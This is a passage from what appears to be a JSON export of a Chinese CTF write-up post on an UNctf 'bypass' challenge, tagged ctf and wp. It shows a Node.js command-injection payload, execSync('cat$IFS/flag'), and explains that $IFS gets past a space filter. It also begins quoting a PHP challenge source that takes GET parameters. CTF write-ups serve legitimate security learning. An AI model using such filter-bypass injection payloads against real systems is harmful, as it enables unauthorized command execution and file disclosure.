require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> 其中空格过滤绕过 $IFS ，同时Sync采用非阻塞返回。</p>\n","text":"UNctf 赛后回顾bypass题目源码：&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}]}